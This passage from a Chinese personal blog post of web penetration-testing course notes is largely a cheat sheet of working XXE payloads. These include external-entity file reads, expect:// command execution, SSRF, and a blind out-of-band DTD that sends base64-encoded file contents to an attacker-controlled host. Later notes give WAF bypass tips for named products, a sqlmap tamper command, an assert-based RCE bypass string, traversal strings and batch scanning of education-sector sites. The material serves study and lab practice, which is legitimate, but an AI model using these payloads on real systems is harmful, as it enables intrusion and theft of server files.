+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span>  <span class="token punctuation">[</span><span class="token internal-subset">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">foo</span>  <span class="token attr-name">ANY</span> <span class="token punctuation">&gt;</span></span>
+
+&lt;!ENTITY rabbit SYSTEM "http://127.0.0.1:8080/index.php"&gt;
+
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;rabbit;">&amp;rabbit;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>#玩法-RCE</strong></p>
+<p>该CASE是在安装<strong>expect扩展</strong>的<strong>PHP环境</strong>里执行系统命令</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version =  "1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
+
+&lt;!ENTITY xxe  SYSTEM "expect://id" &gt; </span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>#引入外部实体dtd</strong> <strong>绕过</strong></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" ?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span>  <span class="token punctuation">[</span><span class="token internal-subset">
+	&lt;!ENTITY % file SYSTEM "http://127.0.0.1:8081/evil2.dtd"&gt;
+	%file;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;send;">&amp;send;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span>
+
+evil2.dtd:
+&lt;!ENTITY send SYSTEM "file:///d:/test.txt"&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>#无回显-读取文件</strong></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span>  <span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=test.txt"&gt;
+&lt;!ENTITY % dtd  SYSTEM "http://127.0.0.1/test.dtd"&gt;
+%dtd;
+%send;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+
+test.dtd：
+&lt;!ENTITY % payload
+	"&lt;!ENTITY <span class="token entity" title="%">&amp;#x25;</span> send SYSTEM 'http://192.168.0.103:8081/?data=%file;' &gt;"
+&gt;
+%payload;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><strong>#协议-读文件（绕过）</strong></p>
+<p><a href="https://www.cnblogs.com/20175211lyz/p/11413335.html">https://www.cnblogs.com/20175211lyz/p/11413335.html</a></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version = "1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">  
+&lt;!ENTITY f SYSTEM  "php://filter/read=convert.base64-encode/resource=xxe.php"&gt; </span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>xxe-lab 靶场登陆框 xml 数据传输测试-检测发现</p>
+<p>1.提交的数据包含 XML 格式如：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">ANY</span> <span class="token punctuation">[</span><span class="token internal-subset">
+	&lt;!ENTITY xxe  SYSTEM "file:///d:/test.txt"&gt;</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2.请求头中如：</p>
+<p>Content-Type：text/xml 或 Content-type:application/xml</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0"?&gt;</span>
+<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span>  <span class="token name">Mikasa</span> <span class="token punctuation">[</span><span class="token internal-subset">
+&lt;!ENTITY test  SYSTEM "[file:///d:/test.txt](file:///d:/test.txt)"&gt;
+</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">&gt;</span></span>Mikasa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>CTF-Vulnhub-XXE 安全真题复现-检测,利用,拓展,实战</p>
+<p>扫描 IP 及端口-&gt;扫描探针目录-&gt;抓包探针 xxe 安全-&gt;利用 xxe 读取源码-&gt;flag 指向文件-&gt;base32 64 解</p>
+<p>密-&gt;php 运行-&gt;flag</p>
+<!--?xml  version="1.0" ?-->
+
+
+
+<!--ENTITY sp  SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php"-->
+
+<p>]&gt;</p>
+<p><root><name>&amp;sp;</name><password>hj</password></root></p>
+<p>Ø  CTF-Jarvis-OJ-Web-XXE 安全真题复现-数据请求格式</p>
+<p><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<p>更改请求数据格式：application/xml</p>
+<!--?xml version =  "1.0"?-->
+
+
+
+<p>]&gt;</p>
+<p><x>&amp;f;</x></p>
+<p>Ø xxe  安全漏洞自动化注射脚本工具-XXEinjector(Ruby)</p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
+<p>xxe_payload_fuzz</p>
+<p>涉及资源：</p>
+<p><a href="http://web.jarvisoj.com:9882/">http://web.jarvisoj.com:9882/</a></p>
+<p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p>
+<p><a href="https://github.com/enjoiz/XXEinjector">https://github.com/enjoiz/XXEinjector</a></p>
+<p><a href="https://download.vulnhub.com/xxe/XXE.zip">https://download.vulnhub.com/xxe/XXE.zip</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/9614990.html">https://www.cnblogs.com/bmjoker/p/9614990.html</a></p>
+<p>DAY-49 WAF绕过-漏洞利用之注入上传跨站等绕过</p>
+<p>2022年8月29日</p>
+<p>17:48</p>
+<p>#SQL 注入</p>
+<p>如需 sqlmap 注入 修改 us  头及加入代理防 CC 拦截自写 tamper 模块</p>
+<p>小迪安全</p>
+<p>安全狗：参考之前 payload</p>
+<p>Aliyun：基本修改指纹即可</p>
+<p>宝塔：匹配关键字外加/*等</p>
+<p>sqlmap  –proxy=”<a href="http://127.0.0.1:8080&quot;">http://127.0.0.1:8080"</a> –tamper=”waf.py” –random-agent</p>
+<p>#文件上传</p>
+<p>1.php 截断 参考前面上传 waf  绕过 payload</p>
+<p>#XSS 跨站</p>
+<p>利用 XSStrike  绕过加上–timeout 或–proxy 绕过 cc</p>
+<p>#其他集合</p>
+<p>RCE：</p>
+<p>加密加码绕过？算法可逆？关键字绕过？提交方法？各种测试！</p>
+<p>txt=$y=str_replace(‘x’,’’,’pxhpxinxfo()’);assert($y);&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>文件包含：没什么好说的就这几种</p>
+<p>..\ …./  ...\等</p>
+<p>DAY-86 SRC 挖掘-教育行业平台&amp;规则&amp;批量自动化</p>
+<p>2022年8月13日</p>
+<p>21:21</p>
+<p><img src="/file6280.files/image044.png" alt="img"></p>
+<p><img src="/file6280.files/image045.png" alt="img"></p>
+<p>参考：<a href="https://src.sjtu.edu.cn/introduction/">https://src.sjtu.edu.cn/introduction/</a></p>
+<p>edu.cn域名</p>
+<p>fofa搜索</p>
+<p>批量化检测脚本</p>
+<h2 id="演示案例：-7"><a href="#演示案例：-7" class="headerlink" title="演示案例："></a>演示案例：</h2><p>Python-Fofa-Xray 联动常规批量自动化</p>
+<p>Python-Fofa-Exploit 联动定点批量自动化</p>
+<p>Python-Fofa-平台默认口令安全批量自动化</p>
+<h2 id="涉及资源：-6"><a href="#涉及资源：-6" class="headerlink" title="涉及资源："></a>涉及资源：</h2><p><a href="https://www.seebug.org/">https://www.seebug.org/</a></p>
+<p><a href="https://github.com/Miagz/XrayFofa">https://github.com/Miagz/XrayFofa</a></p>
+<p><a href="https://quake.360.cn/quake/welcome">https://quake.360.cn/quake/welcome</a></p>
+<p><a href="https://github.com/TimelineSec/2020-Vulnerabilities">https://github.com/TimelineSec/2020-Vulnerabilities</a></p>
+<p><a href="https://github.com/ihebski/DefaultCreds-cheat-sheet">https://github.com/ihebski/DefaultCreds-cheat-sheet</a></p>
+
+        </div>
+
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+<nav class="article-nav">
+  
+    <a href="/2022/txyl/" id="article-nav-newer" class="article-nav-link-wrap">
+      <div class="article-nav-caption">下一篇</div>
+      <div class="article-nav-title">
+        
+          深渊-WUT信息工程教材习题参考答案汇
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/windowscmd/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-caption">上一篇</div>
+      <div class="article-nav-title">学习札记-Windows命令基础</div>
+    </a>
+  
+</nav>
+
+
+    <section class="share">
+        <div class="share-title">分享</div>
+        <a class="share-item" target="_blank"
+            href="https://twitter.com/share?text=渗透测试——XD_Web安全基础 - Kmoon&url=https%3A%2F%2Fwww.kmoon.fun%2F2022%2Fxdsec%2F">
+            <ion-icon name="logo-twitter"></ion-icon>
+        </a>
+        <a class="share-item" target="_blank"
+            href="https://www.facebook.com/sharer.php?title=渗透测试——XD_Web安全基础 - Kmoon&u=https%3A%2F%2Fwww.kmoon.fun%2F2022%2Fxdsec%2F">
+            <ion-icon name="logo-facebook"></ion-icon>
+        </a>
+        <!-- <a class="share-item" target="_blank"
+            href="https://service.weibo.com/share/share.php?title=渗透测试——XD_Web安全基础 - Kmoon&url=https://www.kmoon.fun/2022/xdsec/&pic=">
+            <div class="n-icon n-icon-weibo"></div>
+        </a> -->
+    </section>
+
+</article>
+
+
+
+
+
+
+
+
+
+
+<section class="comments">
+    <div id="valine-container"></div>
+</section>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+
+
+
+
+<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+</div>
+                </section>
+            </section>
+
+            
+            <aside class="sidebar sidebar-search-fix">
+                
+
+    <div class="search">
+    <div class="has-icon-right">
+        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
+        <div class="form-icon">
+            <ion-icon name="search"></ion-icon>
+        </div>
+    </div>
+    <div class="search-result" id="search-ps"></div>
+</div>
+
+
+<div class="widget" id="widget">
+    
+      
+  <div class="widget-wrap">
+    <div class="widget-inner">
+      <div class="toc post-toc-html"></div>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-cate">
+    <div class="widget-title"><span>Categories</span></div>
+    <div class="widget-inner">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/XiaoHu-s-Daily/">XiaoHu's Daily</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%96%E5%B1%B1%E4%B9%8B%E7%9F%B3/">他山之石</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">刷题笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/">学习札记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">实验报告</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%87%92%E4%BA%BA%E5%BF%85%E5%A4%87/">懒人必备</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9C%AA%E5%91%BD%E5%90%8D/">未命名</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B7%B1%E6%B8%8A/">深渊</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/">渗透工具</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E6%97%A5%E8%AE%B0/">靶场日记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%A1%B9%E7%9B%AE%E8%AE%A1%E5%88%92/">项目计划</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-tags">
+    <div class="widget-title"><span>Tags</span></div>
+    <div class="widget-inner">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/51%E5%8D%95%E7%89%87%E6%9C%BA/" rel="tag">51单片机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Google/" rel="tag">Google</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RNN/" rel="tag">RNN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL/" rel="tag">SQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SRC/" rel="tag">SRC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sec/" rel="tag">Sec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WUT/" rel="tag">WUT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Whut/" rel="tag">Whut</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/daily/" rel="tag">daily</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hacker/" rel="tag">hacker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/markdwon/" rel="tag">markdwon</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/me/" rel="tag">me</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload/" rel="tag">upload</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag">信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%B3%E7%B3%BB%E4%BB%A3%E6%95%B0/" rel="tag">关系代数</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%95%E7%89%87%E6%9C%BA/" rel="tag">单片机</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E4%B9%A0%E9%A2%98/" rel="tag">复习题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/" rel="tag">实验报告</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" rel="tag">数学建模</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86/" rel="tag">数据库系统原理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" rel="tag">文件上传漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%84%E7%BD%91%E6%8A%80%E6%9C%AF/" rel="tag">组网技术</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%BD%91/" rel="tag">计网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%BC%8F%E6%B4%9E/" rel="tag">跨站请求伪造漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">靶场</a></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap widget-recent-posts">
+    <div class="widget-title"><span>Recent Posts</span></div>
+    <div class="widget-inner">
+      <ul>
+        
+          <li>
+            <a href="/2022/google/">他山之石-GoogleHacking谷歌语法</a>
+          </li>
+        
+          <li>
+            <a href="/2022/action/">开门见山-欢迎来到Kmoon的小世界</a>
+          </li>
+        
+          <li>
+            <a href="/2022/c/">实验报告-WUT_C++程序设计实验报告</a>
+          </li>
+        
+          <li>
+            <a href="/2022/project1/">项目计划-[推推]:小说更新就通知(测试)</a>
+          </li>
+        
+          <li>
+            <a href="/2022/jw/">学习札记-计算机网络</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget-wrap widget-archive">
+    <div class="widget-title"><span>Archive</span></div>
+    <div class="widget-inner">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li></ul>
+    </div>
+  </div>
+
+
+    
+</div>
+
+<div id="backtop"><i class="icon icon-arrow-up"></i></div>
+            </aside>
+            
+        </div>
+    </div>
+
+    <footer class="footer">
+    <div class="footer-wave">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
+    </div>
+
+    <!-- Please do not remove this -->
+    <!-- 开源不易，请勿删除 -->
+    <div class="footer-wrap">
+        <div class="footer-inner"> 
+            Kmoon &copy; 2022<br>
+            Powered By Hexo · Theme By <a href="https://linhong.me/" target="_blank">Aomori</a> · <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Github</a>
+        </div>
+    </div>
+
+</footer>
+
+<script type="module" src="https://unpkg.com/ionicons@6.0.2/dist/ionicons/ionicons.esm.js"></script>
+
+
+
+
+
+
+<script src="/dist/build.js?1654266144177.js"></script>
+
+
+<script src="/dist/custom.js?1654266144177.js"></script>
+
+
+
+<!-- 百度链接提交 -->
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        }
+        else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":220,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
